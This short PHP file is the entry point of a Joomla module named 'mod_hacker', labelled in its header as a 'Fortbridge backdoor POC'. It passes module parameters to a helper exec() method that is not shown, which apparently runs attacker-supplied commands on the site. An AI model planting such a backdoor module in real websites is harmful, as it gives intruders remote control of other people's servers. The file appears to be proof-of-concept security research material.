<?php
/**
 * 
 * Fortbridge backdoor POC
 */

// No direct access
defined('_JEXEC') or die;
// Include the syndicate functions only once
require_once dirname(__FILE__) . '/helper.php';

$out = ModHackerHelper::exec($params);
require JModuleHelper::getLayoutPath('mod_hacker');
